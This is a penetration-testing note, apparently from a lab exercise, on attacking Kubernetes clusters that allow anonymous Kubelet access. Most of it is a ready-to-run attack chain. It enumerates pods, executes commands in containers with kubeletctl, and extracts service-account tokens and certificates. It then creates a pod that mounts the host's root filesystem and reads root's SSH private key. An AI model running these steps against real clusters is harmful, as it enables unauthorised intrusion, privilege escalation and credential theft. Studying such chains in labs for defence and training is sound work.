
## Enumeration

In Kubernetes, the `Kubelet` can be configured to permit `anonymous access`. By default, the Kubelet allows anonymous access.

#### K8's API Server Interaction

```sh
curl https://10.129.10.11:6443 -k
```
#### Kubelet API - Extracting Pods

```sh
curl https://10.129.10.11:10250/pods -k | jq .
	### The information displayed in the output includes the `names`, `namespaces`, `creation timestamps`, and `container images` of the pods. It also shows the `last applied configuration` for each pod, which could contain confidential details regarding the container images and their pull policies.

kubeletctl -i --server 10.129.10.11 pods
### extract pods list

kubeletctl -i --server 10.129.10.11 pods scan rce 
### shows available commands

kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
### interacting with a container (-p pod -c container)
```

---

## Privilege Escalation

[kubeletctl](https://github.com/cyberark/kubeletctl) can be used to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server

```sh 
### extracting token
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

### extracting crt 
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

export token=`cat k8.token` 

### listing privileges
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```
 
 We can `get`, `create`, and `list` pods which are the resources representing the running container in the cluster.
### Pod YAML

Creating a new container with whole host root's files system mounted.
```YAMl
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```sh
### creating pod
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

### checking if pod is made and running
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

### Extracting root's ssh keys on running pod
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

---
